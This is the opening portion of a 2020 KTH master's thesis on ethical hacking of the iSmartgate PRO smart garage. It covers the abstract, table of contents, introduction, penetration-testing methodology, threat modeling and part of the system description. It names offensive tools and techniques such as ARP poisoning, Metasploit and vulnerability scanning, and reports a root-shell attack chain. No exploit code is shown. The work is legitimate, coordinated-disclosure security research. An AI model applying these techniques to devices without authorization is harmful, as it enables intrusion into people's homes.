=== Content from kth.diva-portal.org_e2a480bd_20250119_111832.html ===
IN DEGREE PROJECT COMPUTER SCIENCE AND ENGINEERING,SECOND CYCLE, 30 CREDITS,  STOCKHOLMSWEDEN2020Where's My Car? Ethical Hacking of a Smart GarageMADELEINE BERNERKTH ROYAL INSTITUTE OF TECHNOLOGYSCHOOL OF ELECTRICAL ENGINEERING AND COMPUTER SCIENCEWhere’s My Car? Ethical
Hacking of a Smart Garage

MADELEINE BERNER

Master in Computer Science
Date: June 26, 2020
Supervisor: Pontus Johnson
Examiner: Robert Lagerström
School of Electrical Engineering and Computer Science
Host company: Nixu AB
Swedish title: Var är min bil? Etisk hackning av ett smart garage

iii

Abstract

IoT products are breaking new ground into widespread industries and introduc-
ing potential attack vectors to unprepared environments. Even the new gener-
ation of garage openers, called smart garages, have entered into the world of
IoT. They are connected to the Internet, and are delivered with the goal of pro-
viding more security by merging features from the home surveillance boom.
But do they keep what they promise?

This thesis has evaluated the security of one particular smart garage that is be-
ing sold worldwide – iSmartgate PRO. Penetration testing was conducted with
focus on the web application. A total of eleven vulnerabilities were reported,
including a one-click-root attack that combined three of them into providing
an unauthenticated remote attacker with a root shell. It was concluded that the
product lacked security measures in certain areas.

Keywords: security, smart garage, penetration testing, IoT, threat modeling

Sammanfattning

IoT-produkter bryter ny mark inom spridda branscher, och introducerar po-
tentiella attackvektorer i oförberedda miljöer. Det är inte förvånande att till
och med den nya generationen garageöppnare har tagit ett kliv in i världen av
IoT. Vilket innebär att garageöppnarna är uppkopplade till Internet, kallas för
smarta garage och levereras med målet att bidra till ökad säkerhet med sina
nya funktioner tagna från trenden av hemmaövervakning. Men kan de hålla
vad de lovar?

Det här examensarbetet har utvärderat säkerheten av ett utvalt smart garage
som säljs världen över – iSmartgate PRO. Penetrationstestning genomfördes
med fokus på webbapplikationen. Totalt sett rapporterades elva sårbarheter,
varav en inkluderade en one-click-root-attack som kombinerade tre sårbarheter
till att ge en icke autentisierad fjärrangripare ett root-skal. Den dragna slut-
satsen var att produkten hade utrymme för att förbättra säkerheten.

Nyckelord: säkerhet, smart garage, penerationstestning, IoT, hotmodellering

iv

Acknowledgements

I would like to thank my supervisor from KTH, Professor Pontus Johnson. He
was there from the initial hatching of the thesis idea till the writing of the ﬁnal
words of this report, and he provided me with guidance and insights.

I would also like to thank my supervisor from the partner company Nixu,
Oscar Sandén. He shared knowledge about penetration testing and valuable
advice throughout the whole thesis.

With great support not even corona could stop this thesis from being ﬁnished!

Madeleine Berner
June 2020

v

List of Abbreviations

OWASP Open Web Application Security Project

IoT Internet of Things

PoC Proof of Concept

XSS Cross-Site Scripting

XXE XML External Entities

CSRF Cross-Site Request Forgery

SQL Structured Query Language

DDoS/DoS (Distributed) Denial of Service

HTTP Hypertext Transfer Protocol

HTTPS Hypertext Transfer Protocol Secure

TCP Transmission Control Protocol

UDP User Datagram Protocol

OS Operating System

VMS Video Management System

IFTTT If This, Then That

DOM Document Object Model

PNG Portable Network Graphics

JPEG/JPG Joint Photographic Experts Group

ASCII American Standard Code for Information Interchange

PHP PHP: Hypertext Preprocessor

CVE Common Vulnerabilities and Exposures

CWE Common Weakness Enumeration

ASVS Application Security Veriﬁcation Standard

CAPEC Common Attack Pattern Enumeration and Classiﬁcation

Contents

1

Introduction
1.1 Research Question . . . . . . . . . . . . . . . . . . . . . . .
1.2 Background & Problem Statement
. . . . . . . . . . . . . . .
. . . . . . . . . . . . . . . . . . . . . . .
.
1.3 Objectives .
.
.
.
. . . . . . . . . . . . . . . . . . . . . . .
. .
1.4 Method . .
. .
. . . . . . . . . . . . . . . . . . . . . . .
1.5 Delimitation .
.
.
.
.
.
1.6 Previous Work .
. . . . . . . . . . . . . . . . . . . . . . .
. . . . . . . . . . . . . . . . . . . . . . . .
.
1.7 Report Outline

1
2
2
4
4
4
5
6

2 Methodology

8
8
2.1 Penetration Testing: Overview . . . . . . . . . . . . . . . . .
9
. . . . . . . . . . . . . . . . . . . . . . . .
2.2 Pre-engagement .
2.3
9
Information Gathering . . . . . . . . . . . . . . . . . . . . .
2.4 Threat Modeling . . . . . . . . . . . . . . . . . . . . . . . . 10
. . . . . . . . . . . . . . . . . . . . . 15
2.5 Vulnerability Analysis
. . . . . . . . . . . . . . . . . . . . . . . . 16
2.6 Exploitation .
. . . . . . . . . . . . . . . . . . . . . . . 16
2.7 Post Exploitation .
2.8 Reporting .
. . . . . . . . . . . . . . . . . . . . . . . 16
.
2.9 Model of Threats: STRIDE . . . . . . . . . . . . . . . . . . . 17
2.10 Attack Library: OWASP Top Ten . . . . . . . . . . . . . . . . 18

. .

.

.

.

3 System Under Consideration: iSmartgate PRO
3.1 Components .
. .
3.2 Functionality . .
.
3.3 Technology .

19
. . . . . . . . . . . . . . . . . . . . . . . . 19
. . . . . . . . . . . . . . . . . . . . . . . . 20
. . . . . . . . . . . . . . . . . . . . . . . 22
.

.

Identiﬁed Assets . .

4 Threat Model & Vulnerability Analysis

24
4.1
. . . . . . . . . . . . . . . . . . . . . . . 24
4.2 Architecture Overview . . . . . . . . . . . . . . . . . . . . . 24
4.3 Decomposed IoT System . . . . . . . . . . . . . . . . . . . . 25

vi

CONTENTS

vii

4.4
Identiﬁed Threats . . . . . . . . . . . . . . . . . . . . . . . . 31
4.5 Selected Threats . . . . . . . . . . . . . . . . . . . . . . . . . 36

5 Exploitation & Post Exploitation: Method, Result & Discussion

39
5.1 Lab Environment
. . . . . . . . . . . . . . . . . . . . . . . . 39
5.2 Exploitation Task 1: XSS & Session Hijacking . . . . . . . . 40
5.3 Exploitation Task 2: CSRF . . . . . . . . . . . . . . . . . . . 45
5.4 Exploitation Task 3: Unrestricted File Upload . . . . . . . . . 48
5.5 Exploitation Task 4: Clickjacking . . . . . . . . . . . . . . . 56
5.6 Exploitation Task 5: Remote Code Execution . . . . . . . . . 59
5.7 Exploitation Task 6: Command Injection . . . . . . . . . . . . 60
5.8 Exploitation Task 7: SQL Injection . . . . . . . . . . . . . . . 61
5.9 Exploitation Task 8: Broken Authentication . . . . . . . . . . 63
5.10 Exploitation Task 9: Sensitive Data Exposure . . . . . . . . . 66
5.11 Exploitation Task 10: XXE . . . . . . . . . . . . . . . . . . . 69
. . . . . . . . . 72
5.12 Exploitation Task 11: Broken Access Control
5.13 Exploitation Task 12: Security Misconﬁguration . . . . . . . . 75
5.14 Exploitation Task 13: Insecure Deserialization . . . . . . . . . 79
5.15 Exploitation Task 14: Using Components with Known Vul-

nerabilities .

. . . . . . . . . . . . . . . . . . . . . . . . . . . 80
5.16 Exploitation Task 15: Insuﬃcient Logging & Monitoring . . . 82
5.17 Post Exploitation Task 1: Privilege Escalation . . . . . . . . . 84

6 Reported Vulnerabilities

90
6.1 CVE IDs .
. . . . . . . . . . . . . . . . . . . . . . . . . . 90
6.2 Attacks Exploiting Reported Vulnerabilities . . . . . . . . . . 91

.

.

7 Discussion

95
7.1 Methodology . . . . . . . . . . . . . . . . . . . . . . . . . . 95
7.2 Result
. . . . . . . . . . . . . . . . . . . . . . . . . . 95
7.3 Sustainability and Ethics . . . . . . . . . . . . . . . . . . . . 97

.

.

.

.

8 Conclusion & Future Work

99
8.1 Conclusion . . . . . . . . . . . . . . . . . . . . . . . . . . . 99
. . . . . . . . . . . . . . . . . . . . . . . . . . 100
8.2 Future Work .

Bibliography

A Use Cases

101

103

viii

CONTENTS

B Threat Actors

111

C PoC for CSRF & Unrestricted File Uploading

113
C.1 PoC CSRF & Unrestricted File Uploading: Image . . . . . . . 113
C.2 PoC CSRF & Unrestricted File Uploading: Sound . . . . . . . 117

D PoC for Clickjacking

E PoC for One-click-root

120

124

Chapter 1

Introduction

The market for Internet of Things (IoT) devices is booming. This year (2020)
there will be 20.4 billion IoT devices worldwide 1. One factor that has helped
and will help the development of IoT is the new Fifth Generation (5G) network
2. More devices will hit the market and connect both companies and individ-
uals to the Internet, but it comes with a hidden threat.

IoT devices are famous for their ability to help customers, but they are in-
famous for their security. The security threats that come with bringing an IoT
device into your home are known to the people interested in security, but since
the majority of the customers are not tech-savvy, the awareness of security
threats is low.

This thesis will demonstrate how to examine and audit IoT devices from a
security perspective, by using a speciﬁc IoT system as example. The system is
the iSmartgate PRO, a smart garage that can open, close and monitor a garage
or gate. It has a tilt sensor, a camera with built in microphone and the ability
to play music while the customer is in the garage. The IoT system is remotely
controlled through a mobile app and a web application, and all data is locally
stored to avoid a cloud based solution. However, this IoT system risks com-
prising privacy if its data were made accessible by a malicious user or attacker.

1https://www.gartner.com/en/newsroom/press-releases/2017-02-07-gartner-says-8-

billion-connected-things-will-be-in-use-in-2017-up-31-percent-from-2016
2017-02-07, visited 2020-02-20

2https://www.ericsson.com/en/about-us/company-facts/ericsson-

|

Published

worldwide/india/authored-articles/5g-and-iot-ushering-in-a-new-era | Published unknown,
visited 2020-02-20

1

2

CHAPTER 1.

INTRODUCTION

1.1 Research Question

The research question that was answered in this report was:

How secure is the smart garage iSmartgate PRO?

The research question was broken down into two more detailed sub-questions:

1. Which vulnerabilities exist in the smart garage iSmartgate PRO?

2. How can the vulnerabilities be exploited?

The version that got tested, iSmartgate PRO 1.5.9, was the most current one
during the start of the study. The smart garage was compared to security stan-
dards and recommendations that existed for web applications during the Spring
of 2020.

1.2 Background & Problem Statement

A smart vacuum cleaner, a self-driving tractor and a pacemaker all have two
things in common. They have a computer that can run software, and they are
connected to other devices in order to send and communicate data over the
Internet. Due to their connectivity to the Internet, they all have assigned IP
addresses that are considered unique identiﬁers. These are features of IoT de-
vices, as deﬁned by IEEE [1].

IoT devices can be put in four diﬀerent categories based on their target group.
There exist devices for consumers, for commercial purposes, in the industry
and in diﬀerent infrastructures.

We have seen multiple industries use devices connected to the cloud to improve
the energy eﬃciency or to monitor the life cycle of a component. Examples
of industries that are using IoT devices are the oil industry and the vehicle in-
dustry. When it comes to IoT in infrastructure, so called Smart Cities are a
good example. The interconnected devices that collect data are used to help
improve the life of citizens, visitors and for businesses. Heart rate monitors
used in medicine, like the pacemaker mentioned before, are considered com-
mercial IoT products [2].

Lastly, we have the IoT devices for the consumer market. Here we ﬁnd the

CHAPTER 1.

INTRODUCTION

3

smart vacuum cleaner, home alarm systems, doorlocks and baby monitors.
These are products that are made to make everyday life more convenient where
boring tasks or heavy tasks are being managed by an IoT device. Some of the
products are there to make you feel safe, for example, by providing a pair of
extra eyes that you can use remotely. That safety does not always come with
security.

The attacks against and with IoT devices are becoming more common, along
with the number of new devices. The infamous botnet, called Mirai, is using
vulnerable IoT devices to perform distributed denial of service (DDoS) attacks
[3]. Gartner predicted that this year (2020) 25% of all attacks towards compa-
nies will be done through IoT devices, despite that only 10% of the budget for
IT security is put towards IoT 3.

Back in 2015, the smart garage MyQ Garage from Chamberlain was proven to
have vulnerabilities severe enough to allow a hacker to open the garage door
4.

To make companies spend more resources on their budget for securing their
IoT devices, proof is needed to demonstrate the vulnerabilities. The proof
can then be used to spread awareness to customers in the private market and
to the industrial market. When they realize the impact of the threats towards
their IoT devices, they in turn will start to demand security requirements to the
manufacturers of the devices. In order to compete with other companies, the
manufacturers of the IoT devices will have to develop more secure units.

This thesis is one of the stepping stones towards more secure IoT devices,
since it contains proof of existing vulnerabilities that can be used to formu-
late security requirements. Thus, this thesis is interesting for companies that
are using IoT, civilians considering or in possession of IoT products, and IT
security professionals that are researching IoT security. Indirectly, the thesis
would potentially be able to improve the situation for those who are targets of
botnet attacks where IoT devices are being used.

3https://www.gartner.com/en/newsroom/press-releases/2016-04-25-gartner-says-

worldwide-iot-security-spending-to-reach-348-million-in-2016 | Published 2016-04-25,
visited 2020-02-21

4https://abc7chicago.com/515520/ | Published 2015-02-13, visited 2020-02-20

4

CHAPTER 1.

INTRODUCTION

1.3 Objectives

The objective from the perspective of the degree project was to analyze the
IoT system and decide whether it is secure or not. A comprehensive security
audit has been made (within the deﬁned scope) to investigate potential attack
vectors. Which attack vectors to use was a part of the degree project, including
the penetration testing of them.

The objective from the perspective of the host company Nixu was to evaluate
how the system’s security stand against standards and recommendations that
exist today. Nixu wanted to see a proper and well thought through method-
ology for the tests that would be conducted. They were also interested in ob-
servations of security vulnerabilities that didn’t ﬁt with any of the existing
requirements.

1.4 Method

The study was divided into ﬁve parts:

1. The ﬁrst one consisted of doing a literature study answering the ques-
tions of what is threat modeling and what are the common threats to-
wards smart garages?.

2. The second part answered the question how does the threat model look

like for the system under consideration?.

3. With the constructed threat model, the third part performed a vulnera-

bility analysis. It was used to select threats to explore.

4. The fourth part exploited the threats. This was the testing part where
multiple attack vectors were tried during the penetration tests. The lit-
erature study continued here, studying the diﬀerent attacks tested.

5. The last part was to report the found vulnerabilities to the manufacturer

of iSmartgate PRO. It was done in parallel with the fourth part.

1.5 Delimitation

The delimitations were done in two diﬀerent phases. First cut was made during
the information gathering. It was decided that the following software compo-

CHAPTER 1.

INTRODUCTION

5

nents would not be incorporated in the threat modeling due to legal reasons,
features not enabled by default or limitation of operating systems:

• The ability to connect third parties: Apple HomeKit, Alexa, Google

Assistant, IFTTT, Samsung SmartThings,

• Any component stored in the cloud or in relay servers,

• Windows application for the controller,

• The two iOS apps for the controller and the camera,

• The DDNS for the camera.

The second cut was made after the threat modeling. A full description can be
found in section 4.5. The scope was narrowed down to investigate threats in
the web application of the controller.

1.6 Previous Work

A general introduction to the history of smart garages and previous work of
ﬁnding vulnerabilities in them.

Traditional garage doors use a physical key to unlock and a door handle for
manually opening the door. Smart garages are diﬀerent in the way that the
door is unlocked via an electronic controller pushing a button or via a web/-
mobile application, and the door opens electronically.

Fixed security code

The early electronic garage openers used a ﬁxed security code to communicate
with the door. The ﬁxed code would be sent when the user pressed a button
on a remote. Attackers would try to catch the code being sent when the victim
pressed the button, which required a lot of waiting or reconnaissance to time
the catching with the victim 5.

In 2015, a security researcher was able to hack a garage opener, with reduced
waiting time, by creating OpenSesame from a child toy 6,7. OpenSesame is

5https://www.wired.com/2015/06/hacked-kids-toy-opens-garage-doors-seconds/

| Pub-

lished 2015-06-04, visited 2020-05-01

6https://samy.pl/opensesame/ | Published 2015, visited 2020-05-01
7https://samy.pl/defcon2015/ | Published 2015, visited 2020-05-01

6

CHAPTER 1.

INTRODUCTION

able to try all possible combinations of the ﬁxed security code, removing the
need for the victim to press a button.

Rolling security codes

The same security researcher also discovered a way to hack rolling security
codes for garage doors, called RollJam 8,9. A garage opener using rolling se-
curity codes means that the code to open the garage changes after it had been
used. By using a combination of jamming the radio signal from the remote,
catching the sent signal and replay it, it was possible to open garage doors
using rolling codes.

Smart Garage

Today, the market consists of smart garages, which are connected to the In-
ternet. This opens up a whole new set of attack vectors, adversaries are now
able to exploit vulnerabilities in web applications, remote servers and network
communication.

Even smart garages have been proven to be vulnerable to jamming attacks. Se-
curity researchers from McAfee released a white paper in January 2020 where
they performed a more advanced jamming attack against Chamberlain Smart
Garage Hub MyQ [4].

Based on the knowledge of the author of this thesis, there hasn’t been any
security analysis of smart garages exploring other attack vectors than the com-
munication between the remote and the controller unit.

1.7 Report Outline

The structure of the report is divided into eight chapters. The ﬁrst chapter is
the introduction, where this section is located. After the introduction follows
seven more chapters containing the following information:

• Chapter 2 describing the methodology of penetration testing,

• Chapter 3 the smart garage and its functionality and technology,

8https://samy.pl/defcon2015/ | Published 2015, visited 2020-05-01
9https://www.wired.com/2015/08/hackers-tiny-device-unlocks-cars-opens-garages/

|

Published 2015-08-06, visited 2020-05-01

CHAPTER 1.

INTRODUCTION

7

• Chapter 4 the threat model and vulnerability analysis of the smart garage,

• Chapter 5 the testing of exploits and post exploitation with the belonging

result and discussion,

• Chapter 6 reported vulnerabilities and the attacks’ impact and probabil-

ity of success,

• Chapter 7 discussion of the result and the sustainability and ethics of the

work,

• Chapter 8 conclusion and future work.

Chapter 2

Methodology

This chapter contains the method that was used in the thesis. The method itself
is based on the penetration testing deﬁnition by Weidman [5]. It consists of
seven phases/steps. First a general overview of the penetration testing method
is described, and secondly each of the phases are described below.

2.1 Penetration Testing: Overview

Penetration testing is used to evaluate the security of a system. It could be a
website, a mobile app, a hardware component etc. It includes simulating real
attacks to understand the risk for security breaches within the targeted system.

According to Weidman [5] penetration testing consists of the seven following
phases:

1. Pre-engagement

Establishing an agreement with the client that owns the device. Includ-
ing the scope, the testing window, contact information, formal approval
from potential third parties.

2. Information gathering

Collecting available information about the target that will be used for
threat modeling. Here tools such as port scanners or search engines can
be used.

3. Threat modeling

Ideas for how to attack the target are created based on the previous in-
formation. Each attack gets evaluated based on its impact on the client

8

CHAPTER 2. METHODOLOGY

9

if an attacker would compromise the system with this attack. An action
plan and attack methods can be derived from this step.

4. Vulnerability analysis

Vulnerabilities are being discovered in this step, by using vulnerability
scanners and manual analysis. The probability of having a successful
exploitation is evaluated. Only the prominent vulnerabilities will be se-
lected for the next phase.

5. Exploitation

Here the attacks actually get executed! Manually written scripts, tools
like Metasploit 1 or diﬀerent types of injections are example of tech-
niques that could be used.

6. Post exploitation

A successful exploitation might continue with post-exploitation, where
the researcher is exploring what else could be done. Including, but not
excluded to, the following questions: Can sensitive ﬁles be accessed?
Can privileges be escalated? Can the machine be used to pivot to an-
other?

7. Reporting

The ﬁndings are summarized to the client, preferably with suggestions
of improvement.

2.2 Pre-engagement

The ﬁrst phase, the pre-engagement, is normally done together with the client
that has ordered the penetration test. In this case, the demander of the penetra-
tion test was the researcher herself. Therefore some parts were omitted, like
the contact information and the agreement from third parties. The focus was
put on setting up the scope and the testing window for the project.

2.3 Information Gathering

The second phase can be divided into three parts.

1. Open source intelligence gathering

1https://www.metasploit.com/ | Published unknown, visited 2020-06-24

10

CHAPTER 2. METHODOLOGY

2. Port scanning

3. Traﬃc capturing

Open source intelligence gathering

Open source intelligence gathering is called OSINT. It collects information
about the target company and its employees from legal sources, like social
media and public records. Here it is important to be able to ﬁlter useful infor-
mation from gibberish.

The tools used for the OSINT were the website Netcraft 2, whois, nslookup
and the website fccid.io [6].

Port scanning

Port scanning is an eﬀective method for knowing which services are active. It
will help with the threat modeling. A popular tool to use is nmap [7]. It can
scan ports on speciﬁed IP address ranges, and look for both TCP and UDP
ports. Information about the version of the service running on the port can be
included.

Traﬃc capturing

To gain knowledge about the communication protocols used within the IoT
system, the network traﬃc was captured. The tool used for listening on the
incoming and outgoing traﬃc was Wireshark 3.
In order to route the traf-
ﬁc communicated between the components in the IoT system, two tools were
used. Fiddler 4 was used to set up a proxy to capture the traﬃc from the
mobile applications, and Ettercap 5 was used for ARP poisoning between the
controller and the camera.

2.4 Threat Modeling

Threat modeling is commonly used when doing a security audit or developing
an IT system. The ﬁndings from the literature review of threat modeling made

2https://www.netcraft.com/ | Published unknown, visited 2020-06-24
3https://www.wireshark.org/ | Published unknown, visited 2020-05-21
4https://www.telerik.com/ﬁddler | Published unknown, visited 2020-05-21
5https://www.ettercap-project.org/ | Published unknown, visited 2020-05-21

CHAPTER 2. METHODOLOGY

11

by Xiong and Lagerström [8], said that there is no common ground for the def-
inition of threat modeling. One of the more widely applicable deﬁnition was
coined by Uzunov and Fernandez [9], saying "threat modeling is a process that
can be used to analyze potential attacks or threats, and can also be supported
by threat libraries or attack taxonomies". This deﬁnition will be used in this
thesis.

The purpose for using threat modeling in this thesis was to ﬁnd out which at-
tack vectors existed for the system under consideration (the IoT system). The
result from the threat modeling helped with choosing which potential vulner-
abilities to exploit for the penetration testing phase.

Threat modeling consists of multiple steps [10, 11, 12] 6. It often starts with
creating an architectural overview of the system, then a phase to ﬁnd threats
and it ends with either evaluating the threats or ﬁnding security controls for
the threats.

Threat modeling used to be non-repetitive [11] 7, but today it is an iterative
process 8. That allows for more information about the system to be added
along the way, which is good in a black box perspective where you might not
know everything from the beginning. Its feature of being iterative makes it
useful in agile development processes.

The following sections are describing the the diﬀerent perspectives for the
threat modeling and the chosen threat modeling method.

2.4.1 Perspective

A parameter that will aﬀect the choice of threat model methodology/approach
is the perspective of the planned penetration tests.

6https://developer.arm.com/architectures/security-architectures/platform-security-

architecture | Published unknown, visited 2020-02-24

7https://docs.microsoft.com/en-us/previous-versions/msp-n-

p/ﬀ648644(v=pandp.10)?redirectedfrom=MSDN | Published 2003-06, visited 2020-02-26

8https://docs.microsoft.com/en-us/previous-versions/msp-n-

p/ﬀ648006(v=pandp.10)?redirectedfrom=MSDN | Published 2005-05, visited 2020-02-26

12

CHAPTER 2. METHODOLOGY

White box

In a white box perspective the content inside the system is known to the re-
searcher. For example the source code and encryption keys are made available.
This is of great help for designing security tests and a common case for a se-
curity researcher at the company manufacturing the product. [13]

For threat modeling, having a white box perspective opens up the opportunity
to conduct interviews with the developers of the product, where information
about the system can be clariﬁed. The threat model can even be veriﬁed by the
developers, if the resources exist to conduct this type of collaboration.

Black box

This was the perspective for the threat modeling in this thesis.

The content is not known to the researcher and the existing technical docu-
mentation is limited. Information such as which operating system the device
is running could be hidden from the researcher. The technical information is
instead derived from trial-and-error. [10]

2.4.2 Approach

The chosen threat modeling approach [10] had ﬁve steps:

1. Identify assets

2. Create an architecture overview

3. Decompose the IoT system

4. Identify threats

5. Document threats

The sixth step (rate the threats) was omitted, and instead the vulnerability
analysis had a greater impact on the selection of threats.

The threat modeling approach is based on a previous threat modeling ap-
proach from Microsoft 9 that was used for developing secure web applications.

9https://docs.microsoft.com/en-us/previous-versions/msp-n-

p/ﬀ648644(v=pandp.10)?redirectedfrom=MSDN | Published 2003-06, visited 2020-02-26

CHAPTER 2. METHODOLOGY

13

The latest released threat modeling approach from Microsoft 10 is similar, but
wasn’t chosen to be used. The reason was that it included two phases that
could not be performed within the scope of the study.

The two phases were the starting phase where security requirements are de-
ﬁned and the ﬁnal phase where the mitigation of the threats are validated,
which implies that actions have been taken for doing mitigation of found vul-
nerabilities. Since no collaboration existed from the beginning with the manu-
facturer, no requirements could be deﬁned. The vulnerabilities eventually got
reported to the manufacturer, but how the manufacturer handled the informa-
tion sent to them was not a part of this thesis, thus the mitigation phase was
excluded.

The threat modeling approach allows for iterations. New information about
the IoT device can be found later on in the penetration testing phases, for ex-
ample in the vulnerability analysis or in the exploitation phases. Then newly
discovered assets, technologies or threats can be added to the threat model.

The tools used for creating the threat model were Microsoft Threat Modeling
Tool 11 and diagrams.net 12 (previously draw.io).

Identify assets

The assets were identiﬁed and placed in table 4.1. All assets were assigned an
ID and a description.

Create an architecture overview

Documentation of the functionality, applications, technologies and physical
architecture based on the information from the previous step were made. Three
types of output came from this phase:

• Use cases were written to identify functionality and features (table 4.2),

• A data ﬂow diagram was created to visualize components (ﬁgure 4.1),

10https://docs.microsoft.com/en-us/previous-versions/msp-n-

p/ﬀ648006(v=pandp.10)?redirectedfrom=MSDN | Published 2005-05, visited 2020-02-26

11https://docs.microsoft.com/en-us/azure/security/develop/threat-modeling-tool

| Pub-

lished 2017-02-16, visited 2020-06-24

12https://www.diagrams.net/ | Published unknown, visited 2020-06-24

14

CHAPTER 2. METHODOLOGY

• A table was made with the technologies used in the IoT device (table

4.3).

There is a whole separate chapter for describing the functionalities and features
of the IoT system. See chapter 3 for detailed description.

Decompose the IoT system

In the third phase the application and protocol data ﬂows were analyzed to dis-
cover vulnerable entry points. The entry points could be to the device or to a
client application. The data ﬂow was visualized in multiple data ﬂow diagram.

Then the entry points were documented in tables 4.4, 4.5 and 4.6. Each entry
point was assigned an ID and a description.

Identify threats

The actual threats were identiﬁed in the fourth phase. To help ﬁnding and cat-
egorizing the threats three tools were used. The Cyber Bogies card deck, the
STRIDE model and the attack library OWASP Top Ten were used.

The Cyber Bogies card deck is a gallery of usual suspects that pose a threat
towards IT systems or processes 13. It was developed by the security company
Nixu and released just in time for this thesis in February 2020. The cards are
a ﬁne-tuned version of Persona non Grata [14], and include malicious and un-
intentional actors that could form some kind of threat.

STRIDE is a model of threats and consists of six threat types, which make
up the mnemonic. To make sure to cover all potential threats against IoT de-
vices, two more threat types were added: physical security bypass and supply
chain issues. It was developed by Praerit Garg and Loren Kohnfelder at Mi-
crosoft 14. The six threat types are described in section 2.9.

During the threat modeling it was discovered that two web applications were
included in the IoT system. Since the STRIDE model is considered to be on an
abstract level, an attack library was added to help with the threat modeling of

13https://github.com/nixu-corp/NixuCyberBogies | Published 2020-02, visited 2020-03-

30

14https://www.microsoft.com/security/blog/2009/08/27/the-threats-to-our-products/

|

Published 2009-08, visited 2020-03-30

CHAPTER 2. METHODOLOGY

15

the web applications. The recommended attack library for web applications by
Shostack [11] was OWASP Top Ten 15. The attack library provided more de-
tailed threats and was therefore used for the web applications. It can be found
in section 2.10.

The threat actors were summarized in section 4.4.1. The STRIDE threats were
written down for each threat type in table 4.7. The OWASP Top Ten threats
were listed together with the threats later discovered through the vulnerability
analysis in the ﬁfth phase.

Document threats

Selected threats from phase 4 were listed in section 4.5.

2.5 Vulnerability Analysis

In the fourth step, potential attack surfaces were analyzed to go from identiﬁed
threats to conﬁrmed vulnerabilities. The initial results from the vulnerability
analysis were used to improve the threat model, by excluding previous inter-
esting threats and include new threats.

Vulnerability analysis can be done in two ways:

1. Vulnerability scan

2. Manual analysis

Both of them were used in this study.

Manual analysis

The manual analysis consisted of interacting with the discovered ports from
Information about the used protocols were
the information gathering step.
research in attempt to ﬁnd known vulnerabilities based on version number.

Vulnerability scan

Four diﬀerent tools were used for scanning the IoT system: Nessus, Metas-
ploit, Nikto and Burp Suite Professional.

15https://owasp.org/www-project-top-ten/ | Published 2020, visited 2020-04-01

16

CHAPTER 2. METHODOLOGY

Initially Nessus 16 was used, since it has a broader scanning scope within one
single scan than the rest [5]. The devices within the IoT system that com-
municate over Wi-Fi were scanned. The ﬁndings were passed on to either be
analyzed manually, or to use Metasploit’s scanning modules.

Web applications were scanned with Nikto. The tool scans web servers for
dangerous ﬁles/programs, outdated versions of components, server version
speciﬁc problems and server conﬁguration items 17.

Access to Burp Suite Professional, which has the web vulnerability scanner
18, was made available after the delimitation of the scope was made and the
exploitation phase had started. Thus, it was only used for the web application
of the controller. Both passive and active scans were made.

2.6 Exploitation

Attacks were planned and tested. If an attack was successful, it was reported
to the manufacturer according to the reporting step described in section 2.8.
The lab environment for the testing and the performed tests are described in
chapter 5.

2.7 Post Exploitation

After a successful attempt to get a shell on the IoT system, the sixth step was
conducted. The post exploitation is also described in chapter 5.

2.8 Reporting

Once a vulnerability was discovered and conﬁrmed with a proof of concept
(PoC), the manufacturer of the IoT system was contacted. A description of the
vulnerability, a video demonstrating a ﬁctional attack and a written PoC (if
asked for) was sent to them by using their choice of communication medium.

16https://www.tenable.com/products/nessus | Published unknown, visited 2020-05-20
17https://tools.kali.org/information-gathering/nikto | Published 2014-02-18, visited 2020-

05-20

18https://portswigger.net/burp/vulnerability-scanner | Published unknown, visited 2020-

05-20

CHAPTER 2. METHODOLOGY

17

This thesis is the main part of the written reporting. The public release of the
reporting followed the default disclosure timeframe described in The CERT®
Guide to Coordinated Vulnerability Disclosure [15].

2.9 Model of Threats: STRIDE

STRIDE is an acronym used in threat modeling for identifying threats 19. The
six categories of threats can be paired with security properties. The acronym
stands for:

Spooﬁng Identity

Impersonating or posing as another user or identity of a component/process.
The threat is violating the authentication of the system.

Tampering with Data

Modifying a state or any other type of data at rest or in transit. The threat is
violating the integrity of the system.

Repudiation of Action

Denying responsibility for actions taken by yourself. For example being able
to delete or change logs. The threat is violating non-repudiation.

Information Disclosure

Accessing sensitive information in the system without being authorized. It
could for example be used for developing further exploits or be sold for proﬁt.
The threat violates the conﬁdentiality of the system.

Denial of Service

Causing resources to not be available for others. For example locking a vic-
tim’s user account by typing the wrong password too many times. The threat
violates the availability of the system.

19https://docs.microsoft.com/en-us/archive/msdn-magazine/2006/november/uncover-
security-design-ﬂaws-using-the-stride-approach | Published 2019-10-07, visited 2020-05-22

18

CHAPTER 2. METHODOLOGY

Elevation of Privilege

Gaining higher privileges than what you are authorized for. In Linux systems,
the goal is normally to go from the default user to root. The threat violates the
authorization of the system.

2.10 Attack Library: OWASP Top Ten

The Open Web Application Security Project (OWASP) works with improving
the security of software, and runs the project OWASP Top Ten. The project
is a standard to bring security awareness to developers. The list consists of
the ten most common security risks in web applications. Depending on the
deﬁnition of the word risk, it is synonymous with threat. The latest publication
of OWASP Top Ten was made in 2017 20. Here follows the list:

1. Injection

2. Broken Authentication

3. Sensitive Data Exposure

4. XML External Entities (XXE)

5. Broken Access Control

6. Security Misconﬁguration

7. Cross-Site Scripting (XSS)

8. Insecure Deserialization

9. Using Components with Known Vulnerabilities

10. Insuﬃcient Logging & Monitoring

To read more about each security risk, see each exploitation task in chapter 5.

20https://owasp.org/www-project-top-ten/ | Published 2020, visited 2020-04-01

Chapter 3

System Under Consideration: iS-
martgate PRO

The investigated smart garage in this thesis was the iSmartgate PRO, from
Gogogate INC. The ﬁrmware version 1.5.9 was at the time of the testing (Spring
2020) the most current one, and the version used for all tests.

3.1 Components

Hardware

The iSmartgate PRO used for this work consisted of three hardware compo-
nents (see ﬁgure 3.1):

1 controller

1 tilt sensor

1 camera

(a)

(b)

(c)

Figure 3.1: (a) The controller (b) The tilt sensor (c) The camera

19

CHAPTER 3. SYSTEM UNDER CONSIDERATION: ISMARTGATE

20
PRO

The tilt sensor is a wireless sensor, and two diﬀerent types can be ordered
depending on how the door/gate opens up. For example, the door/gate could
move sideways or reach the open state by tilting itself up. The camera is an add-
on from the same vendor, and not included in standard order of the iSmartgate
PRO. It comes in the smart garage package iSmartgate PRO Ultimate. The
camera has a built-in microphone, a speaker and infra-red vision.

Software

The software components that came with the hardware were in total nine sep-
arate installations:

Controller: 1 web server, 2 mobile apps (Android/iOS), 1 remote relay
server and 1 Windows app

Camera: 1 web server, 2 mobile apps (Android/iOS) and 1 video man-
agement system (VMS)

The ability to integrate the smart garage with a smart home such as Apple
HomeKit, Google Assistant, iFTTT and Samsung SmartThings exists.

The camera also came with the possibility to enable remote access via dy-
